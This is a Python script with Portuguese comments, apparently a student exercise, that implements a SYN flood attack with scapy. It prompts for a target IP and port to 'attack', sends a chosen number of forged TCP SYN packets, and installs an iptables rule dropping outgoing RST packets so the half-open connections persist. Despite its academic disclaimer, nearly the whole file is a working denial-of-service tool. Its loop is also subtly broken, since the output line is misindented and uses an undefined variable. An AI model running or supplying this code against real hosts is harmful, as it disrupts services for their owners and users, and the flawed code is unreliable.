"""
Exercício - Elaborar um SYN flood

Este módulo inclui funções para:
- Validação de endereços IPv4;
- Verificação básica de conectividade a um host;
- Interação com o utilizador através de menu em consola;
- Execução de envio de tráfego TCP para fins académicos.

"""

import socket
import random
import os
import time
import errno
from scapy.all import *

def ip_valido(ip):
    """
    Verifica se uma string corresponde a um endereço IPv4 válido.

    :param ip: Endereço IPv4 em formato string
    :return: True se for válido, False caso contrário
    """
    octetos = ip.split(".")

    if len(octetos) != 4:
        return False

    for i, octeto in enumerate(octetos):
        if not octeto.isdigit():
            return False

        numero = int(octeto)

        if i == 0 or i == 3:
            if numero < 1 or numero > 255:
                return False
        else:
            if numero < 0 or numero > 255:
                return False
    return True

def ip_responde(ip):
    """
    Testa se um IP aparenta responder a uma tentativa de ligação TCP.

    Considera o host ativo se existir resposta ou recusa explícita.

    :param ip: Endereço IPv4
    :return: True se o host aparentar responder, False caso contrário
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        estado_ligacao = sock.connect_ex((ip, 1))
    finally:
        sock.close()

    if estado_ligacao == 0:
        return True
    if estado_ligacao == errno.ECONNREFUSED:
        return True

    return False

def syn_flood(ip, porta, total_pacotes):
    """
    Função principal do exercício responsável pelo envio de tráfego de rede.

    Esta função foi mantida conforme o código original, sendo utilizada
    exclusivamente em contexto académico e em ambientes controlados.

    :param ip: Endereço IPv4 de destino
    :param porta: Porta TCP de destino
    :param total_pacotes: Número de pacotes a enviar
    :return: None
    """
    conf.verb = 0
    delay = 0.01
    pacotes_enviados = 0
    
    if not ip_responde(ip):
        print(f"{ip} - IP não encontrado")
        return

    print(f"\nA enviar {total_pacotes} pacotes TCP SYN para {ip}:{porta}\n")

    for _ in range (total_pacotes):
        porta_origem = random.randint(1024, 65535)
        sequencia = random.randint(0, 2**32 -1) #32 bits
        pacote_syn = IP(dst=ip) / TCP(sport= porta_origem, dport=porta,flags="S", seq=sequencia)
        resposta = sr1(pacote_syn, timeout=0.05)

        if resposta is None:
                estado = "Sem resposta"
        elif resposta.haslayer(TCP):
            flags = int(resposta[TCP].flags)
            if flags & 0x12 == 0x12:
                estado = "Porta aberta (syn/ack)"
            elif flags & 0x04:
                estado = "Porta fechada"
            else:
                estado = f"TCP flags={resposta[TCP].flags}"
        else:
            estado = "A resposta não é TCP"
        
            print(f"SYN {contador} | {ip}:{porta} | {estado}")
            pacotes_enviados += 1        
            time.sleep(delay)
        
def menu():
    """
    Solicita ao utilizador os parâmetros necessários:
    - IP válido
    - Porta TCP válida
    - Número de pacotes a enviar

    :return: Tuplo (ip, porta, pacotes)
    """
    while True:
        ip = input("Introduza o IP que pretende atacar: ").strip()
        if ip_valido(ip):
            break
        print("Introduza um IP válido.")

    while True:
            try:
                porta = int(input("Introduza a porta que pretende atacar: "))
                if (1 <= porta <= 65535):
                    break
                else:
                    print("Introduza uma porta entre 1 e 65535.")
            except ValueError:
                print("A porta tem de ser um número inteiro.")
                
    while True:
            try:
                pacotes = int(input("Número de pacotes TCP SYN a enviar: "))
                if pacotes > 0:
                    break
                else:
                    print("O número de pacotes tem de ser maior que 0.")
            except ValueError:
                print("O número de pacotes tem de ser um inteiro.")

    return ip, porta, pacotes

def main():
    """
    Função principal do programa.

    - Configura regras temporárias do sistema
    - Mostra interface no terminal
    - Recolhe parâmetros do utilizador
    - Executa a funcionalidade principal
    """
    os.system('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
    os.system('clear')
    os.system('figlet Syn Flood')
    print("\nO script pede o IP da máquina alvo do Syn Flood, a porta alvo e o número de pacotes a enviar.\n")

    ip, port, counter = menu()
    syn_flood(ip, port, counter)

    os.system('sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP')
    

if __name__ == "__main__":
    main()
